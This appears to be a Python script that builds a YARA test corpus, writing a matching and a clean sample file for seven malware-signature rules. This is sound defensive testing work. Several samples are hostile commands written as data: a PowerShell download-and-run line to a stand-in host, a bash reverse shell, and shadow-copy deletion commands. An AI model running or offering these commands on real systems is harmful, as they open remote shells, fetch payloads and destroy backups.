#!/usr/bin/env python3
"""
tests/signatures/generate_corpus.py
-------------------------------------
Generates the YARA test corpus required by testing-security-skill:
  - For every rule: one triggering (malicious/defanged) sample
  - For every rule: one non-triggering clean-file sample

Samples are written as binary files to:
  tests/signatures/malicious/   — files that MUST match
  tests/signatures/clean/       — files that MUST NOT match

All "malicious" samples are defanged/inert (no functional code):
  - EICAR string is the canonical safe test payload
  - All other samples are synthetic byte sequences / ASCII patterns
    that match the rule string conditions but contain no executable logic.

Never run this against production paths (testing-security-skill pitfall).
"""

import os
import struct
from pathlib import Path

CORPUS_ROOT = Path(__file__).parent
MALICIOUS_DIR = CORPUS_ROOT / "malicious"
CLEAN_DIR = CORPUS_ROOT / "clean"

MALICIOUS_DIR.mkdir(parents=True, exist_ok=True)
CLEAN_DIR.mkdir(parents=True, exist_ok=True)


def write(path: Path, content: bytes) -> None:
    path.write_bytes(content)
    print(f"  wrote {path.relative_to(CORPUS_ROOT)} ({len(content)} bytes)")


# ---------------------------------------------------------------------------
# Rule 1: EICAR_Test_File
# ---------------------------------------------------------------------------
print("EICAR_Test_File")
write(
    MALICIOUS_DIR / "eicar_test.txt",
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
)
write(
    CLEAN_DIR / "eicar_clean.txt",
    b"This is a completely normal text file with no threats.",
)

# ---------------------------------------------------------------------------
# Rule 2: Trojan_Generic_ObfuscatedPS1_Dropper
# ---------------------------------------------------------------------------
print("Trojan_Generic_ObfuscatedPS1_Dropper")
# Triggering: IEX + DownloadString + -EncodedCommand + http://
ps1_trigger = (
    b"IEX(New-Object Net.WebClient).DownloadString('http://evil.example/p')\n"
    b"powershell -EncodedCommand V2luZG93U3R5bGUgSGlkZGVu\n"
    b"# WindowStyle Hidden\n"
)
write(MALICIOUS_DIR / "ps1_dropper.ps1", ps1_trigger)
# Clean: none of the combined conditions present
write(CLEAN_DIR / "ps1_clean.ps1", b"Write-Host 'Hello, World!'\n")

# ---------------------------------------------------------------------------
# Rule 3: Backdoor_Linux_BashReverseShell
# ---------------------------------------------------------------------------
print("Backdoor_Linux_BashReverseShell")
# Triggering: /dev/tcp pattern + fd redirect + /bin/bash
bash_trigger = b"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n"
write(MALICIOUS_DIR / "revshell.sh", bash_trigger)
# Clean: normal bash script
write(CLEAN_DIR / "revshell_clean.sh", b"#!/bin/bash\necho 'deploy complete'\n")

# ---------------------------------------------------------------------------
# Rule 4: Dropper_Polyglot_ELF_PE_Embed
# ---------------------------------------------------------------------------
print("Dropper_Polyglot_ELF_PE_Embed")
# Triggering: starts with ELF magic, contains MZ header somewhere inside
elf_magic = b"\x7fELF"
pe_magic   = b"MZ"
pe_header  = b"PE\x00\x00"
polyglot   = elf_magic + b"\x00" * 60 + pe_magic + b"\x00" * 20 + pe_header
write(MALICIOUS_DIR / "polyglot_elf_pe.bin", polyglot)
# Clean: only ELF magic, no PE
write(CLEAN_DIR / "clean_elf.bin", elf_magic + b"\x00" * 100)

# ---------------------------------------------------------------------------
# Rule 5: Loader_Generic_XOR_Shellcode_Stub
# ---------------------------------------------------------------------------
print("Loader_Generic_XOR_Shellcode_Stub")
# Triggering: XOR loop bytes + key marker + mprotect prep
xor_loop1    = b"\x30\x1c\x08"    # xor [rcx+rax], bl
xor_jnz      = b"\x75\xf7"        # jnz short
key_marker   = b"\x31\xc0\xb0\x42"  # xor eax,eax; mov al, 0x42
stub_trigger = xor_loop1 + b"\x90" * 10 + xor_jnz + b"\x90" * 5 + key_marker
write(MALICIOUS_DIR / "xor_stub.bin", stub_trigger)
# Clean: simple NOP sled, no XOR patterns
write(CLEAN_DIR / "clean_nops.bin", b"\x90" * 128)

# ---------------------------------------------------------------------------
# Rule 6: CoinMiner_XMRig_Config_Strings
# ---------------------------------------------------------------------------
print("CoinMiner_XMRig_Config_Strings")
# Triggering: XMRig user-agent string
xmrig_trigger = b'XMRig/6.21.0 libuv/1.46.0 OpenSSL/3.0.11\r\n'
write(MALICIOUS_DIR / "xmrig_ua.txt", xmrig_trigger)
# Triggering alternate: full config JSON pattern
xmrig_config = (
    b'{"pools":[{"url":"pool.supportxmr.com:3333","user":"wallet123"}],'
    b'"algo":"randomx","donate-level":1,"tls":false}\n'
)
write(MALICIOUS_DIR / "xmrig_config.json", xmrig_config)
# Clean: unrelated JSON
write(CLEAN_DIR / "clean_config.json", b'{"app":"myapp","version":"1.0"}\n')

# ---------------------------------------------------------------------------
# Rule 7: Ransomware_ShadowCopy_Deletion
# ---------------------------------------------------------------------------
print("Ransomware_ShadowCopy_Deletion")
# Triggering: two shadow copy deletion commands
ransom_trigger = (
    b"vssadmin delete shadows /all /quiet\n"
    b"wmic shadowcopy delete\n"
    b"YOUR FILES HAVE BEEN ENCRYPTED\n"
)
write(MALICIOUS_DIR / "ransomware_note.bat", ransom_trigger)
# Clean: vssadmin used legitimately (list only — no delete)
write(CLEAN_DIR / "vssadmin_clean.bat", b"vssadmin list shadows\n")

print(f"\nCorpus generated:")
print(f"  malicious/ — {len(list(MALICIOUS_DIR.iterdir()))} files")
print(f"  clean/     — {len(list(CLEAN_DIR.iterdir()))} files")
